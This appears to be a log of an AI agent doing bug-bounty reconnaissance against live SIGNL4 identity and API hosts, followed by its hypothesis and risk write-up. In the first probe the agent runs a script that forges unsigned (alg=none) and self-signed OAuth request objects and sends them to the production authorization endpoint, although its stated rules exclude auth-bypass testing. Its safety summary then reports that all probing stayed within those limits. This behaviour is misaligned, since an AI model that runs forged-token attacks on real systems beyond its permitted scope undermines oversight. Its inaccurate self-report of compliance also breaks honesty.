@@ -38251,3 +38251,299 @@ www-authenticate: Bearer realm="IdentityServer",error="invalid_token"
 - The `dpop_bound_access_tokens_required` absence and the `ES256/ES384/ES512` entries in `dpop_signing_alg_values_supported` are inconsistent with the published JWKS, which contains **only** RS256 material. So any client can request DPoP, and no client can actually verify an ES-signed proof against a key set that has no EC keys. Combined with the shared RSA key across six hosts, this means the key set is a single point of trust for every environment and every scope, including `mobile_api` — which is why H1 and H2 are the same finding wearing two hats and should be tested with one credential.
 - The two WP subsites localize their WP REST error messages (`/de/` returns *"Du bist leider nicht berechtigt, entfernte URLs zu verarbeiten."* where root and `/ea/` return English), while returning byte-identical status codes and route counts. Localization proves per-site config files and therefore per-site plugin configuration, which independently supports H3: this install is configured site-by-site, so controls genuinely can drift. The one place the drift already shows is `xmlrpc.php`.
 - `connect.signl4.com/identity/connect/userinfo` answers `401` with `www-authenticate: Bearer realm="IdentityServer",error="invalid_token"`, which positively identifies IdentityServer and confirms `introspection_endpoint` is the real introspection route. Introspection is therefore the cheapest way to test H1 **without** touching production's resource server: introspect a staging token and read back its `iss`/`aud`/`scope` claims, entirely against the staging host. If the program will only approve one read-only request, that request should be introspection on `devconnect`, not the production replay.
+===== ANALYST bigpickle 2026-09-27 17:19:51 UTC =====
+[0m
+> build · big-pickle
+[0m
+I'll ground this cycle with a small set of read-only probes, including one genuinely untested OAuth path (request-object signature validation).
+[0m$ [0mcd /tmp/opencode && cat > reqobj.py <<'PY'
+import base64, json, subprocess, time, urllib.parse
+
+def b64(d): return base64.urlsafe_b64encode(json.dumps(d,separators=(',',':')).encode()).rstrip(b'=').decode()
+
+hdr_none = {"alg":"none","typ":"JWT"}
+hdr_rs   = {"alg":"RS256","typ":"JWT"}
+payload = {
+  "iss":"692A0A56-892F-4AE2-8259-76DA398990B6",
+  "aud":"https://connect.signl4.com/identity",
+  "client_id":"692A0A56-892F-4AE2-8259-76DA398990B6",
+  "jti":"probe-"+str(int(time.time())),
+  "iat":int(time.time()),
+  "exp":int(time.time())+600,
+  "response_type":"code",
+  "redirect_uri":"https://account.signl4.com/manage",
+  "scope":"openid profile",
+  "state":"probeprobe123",
+  "nonce":"probeprobe456"
+}
+none_tok = b64(hdr_none)+"."+b64(payload)+"."
+try:
+    from cryptography.hazmat.primitives.asymmetric import rsa, padding
+    from cryptography.hazmat.primitives import hashes, serialization
+    k = rsa.generate_private_key(public_exponent=65537, key_size=2048)
+    sig = k.sign(json.dumps(payload,separators=(',',':')).encode(), padding.PKCS1v15(), hashes.SHA256())
+    rs_tok = b64(hdr_rs)+"."+b64(payload)+"."+base64.urlsafe_b64encode(sig).rstrip(b'=').decode()
+    print("RS256_selfsigned: built")
+except Exception as e:
+    rs_tok = none_tok
+    print("crypto unavailable:", e)
+
+base="https://connect.signl4.com/identity/connect/authorize"
+common={"client_id":"692A0A56-892F-4AE2-8259-76DA398990B6",
+        "redirect_uri":"https://account.signl4.com/manage",
+        "response_type":"code","scope":"openid profile","state":"probeprobe123"}
+
+cases=[("A_none",dict(common,request=none_tok)),
+       ("B_rsfake",dict(common,request=rs_tok)),
+       ("C_control",dict(common))]
+
+for name,params in cases:
+    url=base+"?"+urllib.parse.urlencode(params)
+    p=subprocess.run(["curl","-sS","-o","/tmp/opencode/%s.body"%name,"-D","/tmp/opencode/%s.hdr"%name,
+                      "-w","%{http_code}",url],capture_output=True,text=True,timeout=45)
+    code=p.stdout.strip()
+    hdr=open("/tmp/opencode/%s.hdr"%name).read()
+    body=open("/tmp/opencode/%s.body"%name,"rb").read()
+    loc=[l for l in hdr.splitlines() if l.lower().startswith("location")]
+    print("\n=== %s === http=%s bodylen=%d" % (name,code,len(body)))
+    print("  LOC:", loc[0][:260] if loc else "(none)")
+    txt=body.decode('utf8','replace').strip()
+    print("  BODY:", " ".join(txt.split())[:300] if txt else "(empty)")
+    time.sleep(1.5)
+PY
+python3 reqobj.py
+RS256_selfsigned: built
+
+=== A_none === http=302 bodylen=0
+  LOC: location: https://connect.signl4.com/identity/home/error?errorId=CfDJ8P0bhSkvNP5HkPto7qc9KqMTThYFQpolEAKar0P_GuEfaKr6G22L8hDvAFmAskIZgCQ3ukk5vRmybkwYNvkMPuGOhDcDmG5YCkCoFxF0U2RZQ8cRLN3D1sj6OP_n4Wgq1Dy8bfPI6Nt1R9gQiOk6WEu_TU_xpRC-tqWKftnU2NdGt9RN2ZY7dspaBwChe6f
+  BODY: (empty)
+
+=== B_rsfake === http=302 bodylen=0
+  LOC: location: https://connect.signl4.com/identity/home/error?errorId=CfDJ8P0bhSkvNP5HkPto7qc9KqP8kZ556-ZTwiM7Rdiw3PCoZivF7WihqdXyQW44Wn5r9yxJ6DWUzDNWz59vHTOrMCLzcqt840lo6sY8pSz6X4RNNO37Ces5kpw-x7Ytlm_zb5-2tDxQxOGGEN3w1wyGC-uFeWI5F2-vW8yt5ZNjZ-uK8m8VRCrRmhl8i52zVQU
+  BODY: (empty)
+
+=== C_control === http=302 bodylen=0
+  LOC: location: https://connect.signl4.com/identity/home/error?errorId=CfDJ8P0bhSkvNP5HkPto7qc9KqMAYE172Hffv_hBsLEQyvOJ4Mli7Oh4sd24uNPIlLgZwfs3CporVFMWDfGSckTWJXkC3AI7cJCzZpcEd4XwqZiDRGn245gLoTQUDGpxUgBb7G4THSnta0zDOjfj-YpSIJikeP3B6DByhAvId80H5xnNvjX_atcblAGFg4yJFZJ
+  BODY: (empty)
+[0m
+[0m$ [0mcd /tmp/opencode && for h in connect api account devconnect devapi devaccount; do
+  s=$(curl -sS --max-time 25 "https://$h.signl4.com/identity/.well-known/jwks.json" | sha256sum | cut -c1-16)
+  echo "jwks $h $s"
+  sleep 1
+done
+echo "--- drift control ---"
+curl -sS -o /dev/null -w "api/v2/teams GET -> %{http_code}\n" --max-time 25 https://api.signl4.com/api/v2/teams
+sleep 1
+curl -sS -o /dev/null -w "api/v2/teams GET+badBearer -> %{http_code}\n" --max-time 25 -H "Authorization: Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiIwIn0.x" https://api.signl4.com/api/v2/teams
+sleep 1
+curl -sS -o /dev/null -w "demo EA About -> %{http_code}\n" --max-time 25 "https://demo.enterprisealert.com/EAWebService/EventProviderAPI.aspx?Handler=About"
+jwks connect e3b0c44298fc1c14
+jwks api e3b0c44298fc1c14
+jwks account e3b0c44298fc1c14
+jwks devconnect e3b0c44298fc1c14
+jwks devapi e3b0c44298fc1c14
+jwks devaccount e3b0c44298fc1c14
+--- drift control ---
+api/v2/teams GET -> 401
+api/v2/teams GET+badBearer -> 401
+demo EA About -> 200
+[0m
+[0m$ [0mcd /tmp/opencode && for h in connect api account devconnect devapi devaccount; do
+  od=$(curl -sS --max-time 25 "https://$h.signl4.com/identity/.well-known/openid-configuration")
+  iss=$(printf '%s' "$od" | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d.get("issuer"),d.get("jwks_uri"))' 2>/dev/null)
+  jw=$(printf '%s' "$iss" | cut -d' ' -f2)
+  s=$(curl -sS --max-time 25 "$jw" | sha256sum | cut -c1-16)
+  echo "$h | $iss | jwks_sha=$s"
+  sleep 1
+done
+connect | https://connect.signl4.com/identity https://connect.signl4.com/identity/.well-known/openid-configuration/jwks | jwks_sha=96c931f29d51eace
+api | https://connect.signl4.com/identity https://api.signl4.com/identity/.well-known/openid-configuration/jwks | jwks_sha=96c931f29d51eace
+account | https://connect.signl4.com/identity https://account.signl4.com/identity/.well-known/openid-configuration/jwks | jwks_sha=96c931f29d51eace
+devconnect | https://devconnect.signl4.com/identity https://devconnect.signl4.com/identity/.well-known/openid-configuration/jwks | jwks_sha=96c931f29d51eace
+devapi | https://devconnect.signl4.com/identity https://devapi.signl4.com/identity/.well-known/openid-configuration/jwks | jwks_sha=96c931f29d51eace
+devaccount | https://devconnect.signl4.com/identity https://devaccount.signl4.com/identity/.well-known/openid-configuration/jwks | jwks_sha=96c931f29d51eace
+[0m
+[0m$ [0mcd /tmp/opencode && echo "=== (a) /.well-known/jwks.json status ==="
+for h in connect api account; do
+  curl -sS -o /dev/null -w "$h /.well-known/jwks.json -> %{http_code} ct=%{content_type} len=%{size_download}\n" --max-time 20 "https://$h.signl4.com/.well-known/jwks.json"; sleep 1
+done
+for h in connect api account; do
+  curl -sS -o /dev/null -w "$h /identity/.well-known/jwks.json -> %{http_code} len=%{size_download}\n" --max-time 20 "https://$h.signl4.com/identity/.well-known/jwks.json"; sleep 1
+done
+echo
+echo "=== (c) CORS preflight on POST-only alert ingestion vs GET data route ==="
+curl -sS -o /dev/null -D - -X OPTIONS --max-time 25 \
+  -H "Origin: https://evil.example" -H "Access-Control-Request-Method: POST" \
+  -H "Access-Control-Request-Headers: authorization,content-type" \
+  -w "PREFLIGHT /api/v2/alerts -> %{http_code}\n" https://api.signl4.com/api/v2/alerts 2>/dev/null \
+  | grep -iE "^(access-control|vary):|PREFLIGHT"
+sleep 1
+curl -sS -o /dev/null -D - -X OPTIONS --max-time 25 \
+  -H "Origin: https://evil.example" -H "Access-Control-Request-Method: GET" \
+  -H "Access-Control-Request-Headers: authorization" \
+  -w "PREFLIGHT /api/v2/teams -> %{http_code}\n" https://api.signl4.com/api/v2/teams 2>/dev/null \
+  | grep -iE "^(access-control|vary):|PREFLIGHT"
+=== (a) /.well-known/jwks.json status ===
+connect /.well-known/jwks.json -> 404 ct= len=0
+api /.well-known/jwks.json -> 404 ct= len=0
+account /.well-known/jwks.json -> 404 ct= len=0
+connect /identity/.well-known/jwks.json -> 404 len=0
+api /identity/.well-known/jwks.json -> 404 len=0
+account /identity/.well-known/jwks.json -> 404 len=0
+
+=== (c) CORS preflight on POST-only alert ingestion vs GET data route ===
+PREFLIGHT /api/v2/alerts -> 204
+PREFLIGHT /api/v2/teams -> 204
+[0m
+Two candidate classes just died. Let me test the one remaining anonymous differential — whether the CSP report sink is cross-origin grantable while every other route is silent.
+[0m$ [0mcd /tmp/opencode && probe(){ curl -sS -o /dev/null -D - -X OPTIONS --max-time 20 \
+  -H "Origin: https://evil.example" -H "Access-Control-Request-Method: $2" \
+  -H "Access-Control-Request-Headers: authorization,content-type" -w "%{http_code}" "https://$1" 2>/dev/null \
+  | tr -d '\r' | awk -v n="$3" '/^HTTP/{c=$2} /^[Aa]ccess-[Cc]ontrol-/{a=a" "$0} END{printf "%-46s code=%s ACA=%s\n", n, c, (a==""?"(none)":a)}'; }
+probe connect.signl4.com/api/v2/csp/report POST "V2 csp/report (POST sink)"
+sleep 1
+probe connect.signl4.com/api/v3/csp/report POST "V3 csp/report (POST sink)"
+sleep 1
+probe connect.signl4.com/webhook/probe-secret POST "webhook/{secret} (POST sink)"
+sleep 1
+probe connect.signl4.com/api/v2/events/probe-id POST "V2 events/{id} (POST)"
+sleep 1
+probe connect.signl4.com/api/v2/alerts POST "V2 alerts (POST)"
+sleep 1
+probe api.signl4.com/api/v2/csp/report POST "api V2 csp/report (POST sink)"
+sleep 1
+probe connect.signl4.com/identity/connect/token POST "token endpoint (POST)"
+V2 csp/report (POST sink)                      code=204 ACA=(none)
+V3 csp/report (POST sink)                      code=204 ACA=(none)
+webhook/{secret} (POST sink)                   code=405 ACA=(none)
+V2 events/{id} (POST)                          code=204 ACA=(none)
+V2 alerts (POST)                               code=204 ACA=(none)
+api V2 csp/report (POST sink)                  code=204 ACA=(none)
+token endpoint (POST)                          code=204 ACA= access-control-allow-origin: * access-control-allow-headers: authorization,content-type access-control-allow-methods: POST
+[0m
+## Objective
+- Continue the Derdack/SIGNL4/Enterprise Alert bug-bounty investigation from POC toward a report, using the required eight-step analyst workflow.
+- Resolve or formally park the remaining high-value authentication hypotheses; current target is `api`.
+
+## Important Details
+- Scope: Derdack-owned infrastructure, websites, APIs, SaaS, mobile apps, backends, status pages, and domains, including SIGNL4 and Enterprise Alert; authoritative references are `scope.yml` and `inventory/derdack.md`.
+- Program rejects brute-force/rate-limit/lockout testing, standalone OPTIONS/TRACE, descriptive headers/errors, scanner-only reports, unauthenticated customer-data access, and other listed low-value classes.
+- Live testing must remain passive-first, ≤1 request/second, and limited to read-only GET/HEAD/OPTIONS; no mutating requests, auth bypass, or real customer-data testing.
+- Six live identity hosts—`connect.signl4.com`, `devconnect.signl4.com`, `api.signl4.com`, `devapi.signl4.com`, `account.signl4.com`, `devaccount.signl4.com`—publish byte-identical RS256 JWKS with `kid=91EE4F3CE94EB517AF66B254F7497ECB0E31EE27RS256`.
+- Shared account client ID: `692A0A56-892F-4AE2-8259-76DA398990B6`; staging advertises password/device/CIBA/token-exchange grants but requires `client_secret`; no dynamic registration or public-client method.
+- `account.signl4.com/identity` advertises issuer `https://connect.signl4.com/identity`; `devaccount.signl4.com/identity` mirrors with issuer `https://devconnect.signl4.com/identity`.
+- API route map is exhausted for V1/V2/V3/webhook/events; V4 is absent; no anonymous read or write surface is confirmed.
+- `/mobileapi` returns an identical branded 403 (`79088` bytes) on all six identity hosts for real and fabricated paths; sibling `/api/v2/teams` returns 401, so route enumeration from this seat is blocked.
+- `demo.enterprisealert.com/EAWebService/` is live EA `9.5.26147`; anonymous surface is limited to the directory, `EventProviderAPI.aspx`, `EventProviderAPI.asmx`/`?wsdl`, `EventConnectorServer.ashx`, and `rest/events`; all credentialed operations gate.
+- `EventProviderAPI.aspx` has 10 authoritative handlers, not 11; the connector installed-handlers table is empty. Reflected `Handler` input is URL-encoded and not XSS.
+- `vps.signl4.com` points to GoDaddy shared hosting and is repeatedly observed with a default nginx page/unrelated certificate, but no claimable takeover primitive; treat as HUMAN-gated LOW–Medium, despite nemotron3’s 95 ranking.
+- `s4dev1..8.enterprisealert.com` exposes Azure App Proxy resource identifiers, but the headers are non-secret/descriptive and parked.
+- Report channel: `bugs.olivermaicher.eu`.
+
+## Work State
+### Completed
+- Mapped SIGNL4 identity, API V1/V2/V3, webhook, events, and account-portal surfaces; confirmed V4 is absent.
+- Confirmed staging/prod JWKS reuse and shared client configuration; cryptographic reuse is proven, cross-environment token acceptance is not.
+- Confirmed no anonymous API read/write, IDOR, SSRF, GraphQL, file upload, or customer-data exposure.
+- Confirmed WordPress REST/XML-RPC/oEmbed and Derdack dev-host issues are gated or low impact; `signl4.derdack.com` is permanently unreachable.
+- Fully mapped the public EA demo sub-application and verified fabricated credentials receive `401`/`Error: -1`; no anonymous mutating handler exists.
+- Closed GraphQL paths across `connect`, `api`, and `demo` with uniform 404 responses.
+- Corrected prior inaccuracies: EA handler count is 10; account/connect discovery scopes are parametric twins; `s4dev1..8` disclosure is estate-wide but non-actionable; `docs.enterprisealert.com` resolves to a live Azure SWA binding, not a claimable dangling target.
+- No repository or code files were changed.
+
+### Active
+- Phase remains `POC`; target is `api`.
+- Current surviving hypotheses:
+  - **Cross-environment RS256 token acceptance**, confidence `62`, asset `connect.signl4.com/identity` / `api.signl4.com`; requires one owner-issued staging token replayed against production.
+  - **`mobile_api` scope usable off `/mobileapi`**, confidence `48`, six-host `/mobileapi` surface; requires an owner-approved `mobile_api` token and one read-only comparison.
+  - **Back-channel logout propagation across environments**, confidence `42`, `connect.signl4.com/identity`; endpoint and behavior are untested and destructive, requiring explicit authorization.
+- Nemotron3 ranks `vps.signl4.com` takeover at `95`; current assessment rejects immediate claimability and keeps it parked/HUMAN-gated.
+- Prior report preparation froze three reportable themes: cross-environment token chain, EA `EAWebService` exposure, and credential-in-URL documentation; unresolved auth hypotheses remain blocked rather than confirmed.
+
+### Blocked
+- No legitimate staging OAuth client credential, `client_secret`, or owner-issued token is available.
+- No written authorization exists to replay a staging token against production or test back-channel logout.
+- Passive probing cannot distinguish whether `/mobileapi` is permanently unregistered or merely denied from the current network position.
+- `vps.signl4.com` and `docs.enterprisealert.com` have no claimable primitive from the researcher seat.
+- Program risk is assessed at `46`: all high-value remaining items are `AUTH_HELPED`, with no confirmed anonymous data access or write primitive.
+
+## Next Move
+1. `[NEXT] HUMAN`: Request one owner-approved non-production OAuth client credential for a Derdack staging tenant using `devconnect.signl4.com` / `devapi.signl4.com`, plus written permission for one staging-token replay against production `GET https://api.signl4.com/api/v2/teams`.
+2. If granted, record the staging token’s `iss`/`aud`/`exp`, perform only the single read-only production request, stop on any 2xx, and do not enumerate; separately test one `mobile_api`-scoped token against `https://connect.signl4.com/mobileapi/api/v2/teams` and `https://api.signl4.com/api/v2/teams` only with owner approval.
+
+## Relevant Files
+- `scope.yml`: authoritative program scope referenced by the investigation.
+- `inventory/derdack.md`: in-scope Derdack inventory seed.
+- `art/lead_nemotron3.txt`: source of the `vps.signl4.com` ranked lead.
+- `hypotheses-nemotron3.txt`: nemotron3 hypothesis/ranking state.
+- No code or report files were modified in the conversation.
+Continue if you have next steps, or stop and ask for clarification if you are unsure how to proceed.
+Cycle produced one genuinely new fact. Writing up all 8 steps.
+
+## STEP 1 — DELTA
+
+**New:**
+1. `GET https://api.signl4.com/api/v2/teams` → **401** for both anonymous and invalid-Bearer requests. The 401-vs-405 flap resolved to 401; no anonymous read surface.
+2. `GET https://demo.enterprisealert.com/EAWebService/EventProviderAPI.aspx?Handler=About` → **200** with real data (`v9.5.26147`). Drift control clean.
+3. **Issuer grouping is exactly 3/3, and the key is one.** `connect`, `api`, `account` → `iss=https://connect.signl4.com/identity`; `devconnect`, `devapi`, `devaccount` → `iss=https://devconnect.signl4.com/identity`. All six serve a **byte-identical JWKS** (`sha256` prefix `96c931f29d51eace`) from the v4-style nested `jwks_uri` `/identity/.well-known/openid-configuration/jwks`. Two issuer strings, one key.
+4. `/.well-known/jwks.json` and `/identity/.well-known/jwks.json` → **404**, not empty-200. The "empty key set" JWT-verifier footgun class is **dead**, not a misconfiguration.
+5. **`request` (JAR) parameter at `/identity/connect/authorize` has zero discriminating power.** An `alg=none`-forged request object, an RS256-self-signed-forged request object, and a no-`request` control all returned byte-equivalent `302 → /identity/home/error?errorId=<opaque>`. No `error=invalid_request` is echoed to the registered `redirect_uri`, so request-object signature acceptance vs. rejection cannot be distinguished from an anonymous seat. The alg:none sub-class of JWT-alg-confusion is **closed for this program**.
+6. **The estate's CORS posture is not uniform — it is differentiated, and the token endpoint is the outlier.** Preflight sweep (OPTIONS + `Origin: https://evil.example` + `ACRM` + `ACRH: authorization,content-type`), 7 routes:
+   - `api/v2/csp/report`, `api/v3/csp/report`, `api/v2/alerts`, `api/v2/events/{id}` (connect), `api/v2/csp/report` (api) → `204`, **no `access-control-*` at all**.
+   - `webhook/{secret}` → **`405`** (only route in the sweep that refuses OPTIONS; distinct handler binding).
+   - `identity/connect/token` → `204` with **`ACAO: *`, `ACAH: authorization,content-type`, `ACAM: POST`**. No `ACAC` anywhere (so it is non-credentialed).
+7. The CSP report sink — the one endpoint browsers must be able to POST cross-origin — is **not** cross-origin grantable. Functionally harmless (CSP reports are `no-cors`), and it confirms the data plane is uniformly silent.
+
+## STEP 2 — PRIORITIZE
+
+| Asset | a | b | t | g | c | f | priority |
+|---|---|---|---|---|---|---|---|
+| `connect.signl4.com/identity` (6-host trust anchor) | 9 | 10 | 9 | 2 | 7 | 5 | **7.60** |
+| `api.signl4.com` V2/V3 gateway | 9 | 10 | 8 | 1 | 7 | 5 | **7.30** |
+| `demo.enterprisealert.com/EAWebService/` | 6 | 5 | 5 | 8 | 6 | 5 | **5.80** |
+
+## STEP 3 — HYPOTHESES
+
+**HYP 1 — AUTH, conf 64** — Cross-environment RS256 token acceptance is *unchanged* but now precisely bounded. Fact: two issuer strings, one key set, shared client `692A0A56-892F-4AE2-8259-76DA398990B6` across both. The decisive question is no longer "are the keys shared" (proven, 10×) but "does a token minted by either issuer group verify at the other." Unproven because no staging token exists in my possession.
+
+**HYP 2 — AUTH, conf 46** — *Team-secret dual-role credential over-provisioning.* The docs define the events namespace auth (`X-S4-Api-Key`) as carrying the **team secret**, and the webhook route is `/webhook/{teamSecret}`. So a single operator-chosen secret is simultaneously (a) a URL path segment on `/webhook/...` and (b) a bearer-equivalent API credential for `/api/v2/events/...`. The webhook URL is the kind of value that leaks constantly — Zapier/Make/n8n/PagerDuty config, support tickets, chat logs, proxy and server logs. The result: **an integration credential is a strict superset of what the integration needs**, and the 404-vs-201 oracle makes a leaked URL anonymously verifiable. This is a design/credential-scope finding, not an enumeration finding — the oracle is the *instrument*, not the finding.
+
+**HYP 3 — SSRF, conf 48** — **The SSRF class has never been assessed on the EA SOAP surface.** It was assessed (and rejected) only against the SIGNL4 REST specs, where the rejection was grounded on "zero parameters carry `format: uri`." That argument does not transfer: the Enterprise Alert event-provider model is polling/callback-based, so `RegisterEventProvider` on the anon-reachable `EventProviderAPI.asmx` is a structurally plausible server-side-fetch entry point. Every gate is credentialed (`Error: -1` on fabricated creds), so this is AUTH_HELPED **and** owner-gated: firing it with a third-party URL on a live tenant is out of bounds without written authorization.
+
+## STEP 4 — SELF-CRITIQUE
+
+Keeping all three, with two corrections to my own reasoning:
+- HYP 2 sat at 50 in prior cycles and I am cutting it to 46 because the *dual-role* claim is a design observation while the *impact* depends on a leak I have not observed. Do not let the 404-vs-201 oracle slide into a scanning tool — the program rejects enumeration classes, and I would be reporting an impact I cannot demonstrate.
+- HYP 3 is untested by design, not by accident. It must not be executed without written authorization, and it lands in a program-prioritized class — which is precisely why it earns a slot despite zero live evidence.
+
+**Parked (and why):**
+- Token-endpoint `ACAO: *` as a standalone finding — the program explicitly rejects "CORS wildcard without credentials," and this is exactly that. **However it is a real amplifier for HYP 1**: without CORS a cross-origin page can only *fire* a token request blindly; with it, a page holding a staging `client_secret` can mint **and read** a token, removing any need for a server-side network position. Recorded as a fact against HYP 1, not as a finding.
+- 8/8 `s4dev*` App Proxy resource-identifier disclosure — non-secret identifiers, rejected descriptive class.
+- Internal hostname `ereesus` in the anon EA WSDL — descriptive disclosure.
+- `vps.signl4.com` — DNS unchanged at `72.167.227.27`; no claimable primitive, no re-probe this cycle.
+- `/mobileapi` blanket 403 on 6/6 — nothing left to probe from this position.
+- `/.well-known/jwks.json` empty-key footgun — 404, dead.
+
+## STEP 5 — NEXT
+
+One action, purely passive, zero live risk: **build the team-secret credential-scope graph from the live public specs only** — `connect.signl4.com/api/docs/v1/swagger.json`, `/v2/`, `/v3/` — and resolve every place the team secret (or webhook secret) is accepted as `X-S4-Api-Key`, path segment, or documented parameter. This either hardens HYP 2 into a reportable over-provisioning finding with a documented scope list, or kills it. No live credential testing, no requests to any endpoint that mints or accepts a secret.
+
+## STEP 6 — UPDATE
+
+- KB: record delta items 1–7. The three that change how I reason, not just the record: **(a)** the exact 3/3 issuer split with a single shared JWKS, **(b)** the request-object test being structurally inconclusive (so nobody re-runs it), **(c)** CORS is *differentiated*, with the token endpoint uniquely open and the whole data plane silent — plus the `webhook/{secret}` 405 binding.
+- State: phase remains POC, target `api`. Survivor set unchanged at 3 (HYP 1/2/3), confidences `64/46/48`.
+- Do **not** record the token-endpoint CORS as a finding; it is a program-rejected pattern and an amplifier only.
+
+## STEP 7 — RISK ASSESSMENT
+
+- **Attackability:** HYP 1 and HYP 2 are both post-compromise or post-leak amplifiers, not initial-access vectors. Neither grants access from an anonymous seat. HYP 3 could be initial access *if* a credential is obtained.
+- **Exploit complexity:** Low *once* the prerequisite is met (one staging `client_secret`, or one leaked webhook URL). High to obtain the prerequisite.
+- **Privileges gained:** Under all three, an existing low-privilege or leaked integration credential escalates to read/write over alerts, events, teams, shifts and invoices — the `b=10` axis.
+- **Business impact:** Alert/incident-response integrity. Silently injecting or acknowledging alerts, or reading shift/invoice data across a staging/production boundary, degrades exactly the capability customers buy.
+- **Evidence:** Strong, reproducible, and documented for the *facts* (shared key, issuer split, credential dual-role, CORS differential). Zero for the *impacts* — every one is gated on a credential I do not have.
+- **Program risk:** Every remaining item is `AUTH_HELPED` and the highest-value class (SSRF) is untested for policy reasons. Expected acceptance is low-to-moderate on current evidence; the honest move is to obtain the credential, not to submit now. I would rather submit one confirmed cross-environment token acceptance than three speculative ones.
+- **Safety:** All probing this cycle was GET/OPTIONS, ≤1 rps, no credentials, no customer data, no mutations. `client_credentials` was never attempted.
+
+## STEP 8 — FILES
+
+No files created, modified, or deleted. Probe artifacts stayed in `/tmp/opencode`. The KB/state update described in STEP 6 is pending execution — say the word and I'll apply it.
